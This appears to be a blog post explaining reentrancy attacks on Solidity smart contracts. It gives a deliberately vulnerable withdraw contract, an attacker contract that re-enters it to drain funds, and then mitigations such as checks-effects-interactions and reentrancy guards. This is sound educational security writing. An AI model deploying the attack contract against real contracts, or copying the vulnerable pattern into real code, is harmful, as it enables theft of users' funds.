@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    
+    <meta itemprop="name" content="Reentrancy Attack | AniLog">
+    <meta itemprop="description" content="This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.">
+
+    
+    <meta name="twitter:title" content="Reentrancy Attack | AniLog">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.">
+    <meta name="twitter:site" content="@kranirudha">
+    <meta name="twitter:creator" content="@kranirudha">
+    <meta name="twitter:image:src" content="https://blog.anirudha.dev/twitter.png">
+
+    
+    <meta name="og:title" content="Reentrancy Attack | AniLog">
+    <meta name="og:description" content="This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.">
+    <meta name="og:image" content="https://blog.anirudha.dev/og.png">
+    <meta name="og:url" content="https://blog.anirudha.dev/">
+    <meta name="og:site_name" content="AniLog">
+    <meta name="og:locale" content="en_GB">
+    <meta name="og:type" content="website">
+
+    <link rel="icon" type="image/png" href="/me.png" />
+
+    <title>Reentrancy Attack | AniLog</title>
+
+    <link rel="stylesheet" href="/assets/main.bundle.css">
+
+    <script>
+      // Set theme before page renders to prevent flash
+      (function() {
+        const savedTheme = localStorage.getItem('theme') || 'dark';
+        if (savedTheme === 'light') {
+          document.documentElement.setAttribute('data-theme', 'light');
+        }
+      })();
+    </script>
+
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-YGZHVY9TD7"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-YGZHVY9TD7');
+    </script>
+    
+
+    
+  </head>
+  <body class="flex flex-col min-h-screen">
+    <header class="sticky top-0 z-50 glass-header">
+  <nav class="container mx-auto max-w-5xl px-8 py-3 flex flex-wrap items-center justify-between">
+    <div class="flex items-center gap-3">
+      <a href="/" class="flex items-center gap-3">
+        <img src="/ani.png" alt="AniLog logo" class="w-10 h-10 object-cover">
+        <h1 class="text-2xl leading-none m-0">AniLog</h1>
+      </a>
+    </div>
+
+    <div class="flex items-center gap-6">
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+        <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="5"></circle>
+          <line x1="12" y1="1" x2="12" y2="3"></line>
+          <line x1="12" y1="21" x2="12" y2="23"></line>
+          <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+          <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+          <line x1="1" y1="12" x2="3" y2="12"></line>
+          <line x1="21" y1="12" x2="23" y2="12"></line>
+          <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+          <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+        </svg>
+        <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+        </svg>
+      </button>
+    </div>
+  </nav>
+</header>
+    <main class="container mx-auto max-w-5xl p-8 grow">
+      
+    <p></p>
+
+    
+        <div class="post-cover-image" style="background-image: url('/images/posts/76e1bbbc-b48e-4a3a-b467-15df1db488f9.webp');"></div>
+    
+
+    <div>
+        <h2>Reentrancy Attack</h2>
+
+        
+
+        
+            <p class="excerpt">This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.</p>
+        
+
+        
+            <div class="mb-2">
+                <a class="tag security" href="/tag/security">security</a><a class="tag ethereum" href="/tag/ethereum">ethereum</a><a class="tag solidity" href="/tag/solidity">solidity</a><a class="tag smart-contracts" href="/tag/smart-contracts">smart-contracts</a><a class="tag wtf" href="/tag/wtf">wtf</a>
+            </div>
+        
+
+        
+            
+                <p class="text-sm italic">Created on
+                    <span datetime="Mon Jul 22 2024 00:00:00 GMT+0000 (Coordinated Universal Time)">July 22, 2024</span>.</p>
+            
+        
+
+        <div class="content post">
+            
+                <hr />
+
+                <h3>Table of Contents</h3>
+
+                <nav class="toc">
+                <ol>
+                    
+                    <li><a href="#how-does-it-work">How does it Work</a>
+            		</li>
+
+                    <li><a href="#example-of-a-vulnerable-contract">Example of a Vulnerable Contract</a>
+            		</li>
+
+                    <li><a href="#exploiting-the-vulnerability">Exploiting the Vulnerability</a>
+            		</li>
+
+                    <li><a href="#how-to-avoid-reentrancy-attacks">How to Avoid Reentrancy Attacks</a>
+            		</li>
+
+                    <li><a href="#best-practices">Best Practices</a>
+            		</li>
+                </ol>
+            </nav>
+
+                <hr />
+            
+
+            <p><strong>Reentrancy attacks</strong> are one of the common security issues that can occur in Solidity smart contracts. They exploit the fact that <strong>a function can be called multiple times before it finishes execution</strong>.<br>
+<em>When a contract A calls a function in contract B, contract B can call back into contract A while it is still running. If contract A has not finished executing and is still holding state, contract B can potentially manipulate that state to gain an unfair advantage.</em><br>
+This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.</p>
+<p><img src="https://media.geeksforgeeks.org/wp-content/uploads/20230130125653/Redesign-blockchain-1.png" alt=""></p>
+<blockquote>
+<p>The most famous reentrancy attack occurred in 2016, resulting in the loss of 3.6 million Ether and leading to the Ethereum hard fork, creating Ethereum (ETH) and Ethereum Classic (ETC) also known as, <strong>The DAO Hack</strong>.</p>
+</blockquote>
+<p>WETH Attack: First ever reentrancy attack was <a href="https://www.reddit.com/r/ethereum/comments/4nmohu/from_the_maker_dao_slack_today_we_discovered_a/?user_id=360657100019">reported</a> on Maker DAO Slack. It can tracked on <a href="https://github.com/pcaversaccio/reentrancy-attacks/issues/1">github issue</a>. It was an intentional one and <a href="https://github.com/blockchainsllc/DAO/pull/242">a patch</a> was later merged about it. You can find more details in <a href="https://web.archive.org/web/20170615055530/http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/">web archive</a>.</p>
+<p>Just in 2021 and 2022 alone, more than a dozen attacks has happened around this. <a href="https://nipunp.medium.com/5-8-21-rari-capital-exploit-timeline-analysis-8beda31cbc1a">Rari Capital Expoit</a>, <a href="https://inspexco.medium.com/reentrancy-attack-on-cream-finance-incident-analysis-1c629686b6f5">Cream Finance</a>, <a href="https://certik.medium.com/fei-protocol-incident-analysis-8527440696cc">Fei Protocol</a>, <a href="https://www.coindesk.com/tech/2022/03/31/ola-finance-exploited-for-36m-in-re-entrancy-attack/">Ola Finance</a>, <a href="https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a">Hyperbears</a>. <a href="https://x.com/BlockSecTeam/status/1546141457933025280">BurgerSwap</a>, <a href="https://therecord.media/2-million-stolen-from-defi-protocol-revest-finance-platform-unable-to-reimburse-victims">Revest Finance</a>, <a href="https://polydex.medium.com/plx-locker-smart-contract-incident-post-mortem-75342124a3e8">PolyDex</a>, and so on…</p>
+<h3 id="how-does-it-work" tabindex="-1">How does it Work</h3>
+<p>In a typical reentrancy attack, an attacker exploits the way Ethereum handles external calls and the sequence in which state changes and value transfers are performed. Here’s a simplified flow:</p>
+<ol>
+<li>
+<p><strong>Attack Contract Initiation</strong>: The attacker deploys a malicious contract.</p>
+</li>
+<li>
+<p><strong>Initial Call</strong>: The attacker triggers a function in the vulnerable contract that sends Ether to the attacker’s contract.</p>
+</li>
+<li>
+<p><strong>Fallback Function</strong>: The attacker’s contract contains a fallback function that calls the vulnerable contract again before the first function call finishes.</p>
+</li>
+<li>
+<p><strong>Repeated Calls</strong>: The process repeats, allowing the attacker to drain funds from the vulnerable contract.</p>
+</li>
+</ol>
+<h3 id="example-of-a-vulnerable-contract" tabindex="-1">Example of a Vulnerable Contract</h3>
+<p>Here’s a basic example of a vulnerable Solidity contract:</p>
+<pre class="language-solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><br><br><span class="token keyword">contract</span> <span class="token class-name">VulnerableContract</span> <span class="token punctuation">{</span><br>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span><br><br>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><br>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span><br>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">"Failed to send Ether"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><span class="token punctuation">}</span></code></pre>
+<p>In this contract, the <code>withdraw</code> function updates the user’s balance after sending Ether. This sequence creates a window for a reentrancy attack.</p>
+<h3 id="exploiting-the-vulnerability" tabindex="-1">Exploiting the Vulnerability</h3>
+<p>The attacker’s contract might look like this:</p>
+<pre class="language-solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><br><br><span class="token keyword">import</span> <span class="token string">"./VulnerableContract.sol"</span><span class="token punctuation">;</span><br><br><span class="token keyword">contract</span> <span class="token class-name">AttackContract</span> <span class="token punctuation">{</span><br>    VulnerableContract <span class="token keyword">public</span> vulnerableContract<span class="token punctuation">;</span><br><br>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _vulnerableContractAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>        vulnerableContract <span class="token operator">=</span> <span class="token function">VulnerableContract</span><span class="token punctuation">(</span>_vulnerableContractAddress<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><br>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>vulnerableContract<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">>=</span> <span class="token number">1</span> ether<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>            vulnerableContract<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token punctuation">}</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><br>        vulnerableContract<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">1</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        vulnerableContract<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><span class="token punctuation">}</span></code></pre>
+<h3 id="how-to-avoid-reentrancy-attacks" tabindex="-1">How to Avoid Reentrancy Attacks</h3>
+<ol>
+<li>
+<p><strong>Check-Effects-Interactions Pattern</strong>: Ensure all internal state changes occur before external calls. This pattern involves three steps:</p>
+<ul>
+<li>
+<p><strong>Checks</strong>: Validate conditions.</p>
+</li>
+<li>
+<p><strong>Effects</strong>: Update internal state.</p>
+</li>
+<li>
+<p><strong>Interactions</strong>: Make external calls.</p>
+</li>
+</ul>
+<pre class="language-solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span><br>    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span><br>    <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">"Failed to send Ether"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span></code></pre>
+</li>
+<li>
+<p><strong>Reentrancy Guards</strong>: Use the <code>nonReentrant</code> modifier from OpenZeppelin’s ReentrancyGuard contract to prevent reentrant calls.</p>
+<pre class="language-solidity"><code class="language-solidity"><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/security/ReentrancyGuard.sol"</span><span class="token punctuation">;</span><br><br><span class="token keyword">contract</span> <span class="token class-name">SecureContract</span> <span class="token keyword">is</span> ReentrancyGuard <span class="token punctuation">{</span><br>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span><br><br>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> nonReentrant <span class="token punctuation">{</span><br>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span><br>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span><br>        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">"Failed to send Ether"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><span class="token punctuation">}</span></code></pre>
+</li>
+<li>
+<p><strong>Avoid</strong> <code>call</code> Method: Prefer using <code>transfer</code> and <code>send</code> methods, which have a fixed gas limit and prevent reentrancy attacks. However, be aware of gas limit changes in <a href="https://eips.ethereum.org/EIPS/eip-1884">EIP-1884</a>.</p>
+<pre class="language-solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span><br>    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span><br>    <span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_amount<span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span></code></pre>
+</li>
+</ol>
+<h3 id="best-practices" tabindex="-1">Best Practices</h3>
+<ol>
+<li>
+<p><strong>Audit Regularly</strong>: Regularly audit smart contracts to identify and mitigate vulnerabilities.</p>
+</li>
+<li>
+<p><strong>Use Established Libraries</strong>: Utilize well-known libraries and packages like OpenZeppelin for security functions.</p>
+</li>
+<li>
+<p><strong>Test Thoroughly</strong>: Conduct extensive testing, including unit tests and fuzz testing, to uncover potential weaknesses.</p>
+</li>
+<li>
+<p><strong>Limit External Calls</strong>: Minimize the number of external calls in your contract, especially those involving value transfers.</p>
+</li>
+</ol>
+<p>:)</p>
+
+        </div>
+
+        <div class="article-end">
+            <span>✦</span>
+            <span>✦</span>
+            <span>✦</span>
+        </div>
+
+        <div class="post-navigation">
+            <div class="post-nav-item post-nav-previous">
+                    <a href="/on-chain-shared-state/">
+                        <span class="nav-arrow">←</span>
+                        <div class="nav-content">
+                            <p class="nav-label">Previous</p>
+                            <p class="nav-title">On-Chain Shared State</p>
+                        </div>
+                    </a>
+                
+            </div>
+
+            <div class="post-nav-item post-nav-next">
+                    <a href="/designing-the-perfect-incentivised-system-part-1/">
+                        <div class="nav-content">
+                            <p class="nav-label">Next</p>
+                            <p class="nav-title">Designing The Perfect Incentivised System - Part 1</p>
+                        </div>
+                        <span class="nav-arrow">→</span>
+                    </a>
+                
+            </div>
+        </div>
+    </div>
+
+    </main>
+    <footer class="sticky bottom-0 z-50 glass-footer py-4">
+  <div class="container mx-auto max-w-5xl px-8 flex items-center justify-between">
+    <div class="text-sm">
+      Blog by Ani
+    </div>
+
+    <div class="flex items-center">
+      <a href="https://anirudha.dev" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="Home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
+        </svg>
+      </a>
+    </div>
+
+    <div class="flex items-center gap-4">
+      <a href="https://github.com/anistark" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="GitHub">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+        </svg>
+      </a>
+      <a href="https://x.com/kranirudha" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="X (Twitter)">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+      </a>
+      <a href="https://linkedin.com/in/kranirudha" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="LinkedIn">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"/>
+        </svg>
+      </a>
+    </div>
+  </div>
+</footer>
+    
+    <script src="https://unpkg.com/clipboard@2/dist/clipboard.min.js"></script>
+    <script src="/assets/main.bundle.js"></script>
+  </body>
+</html>
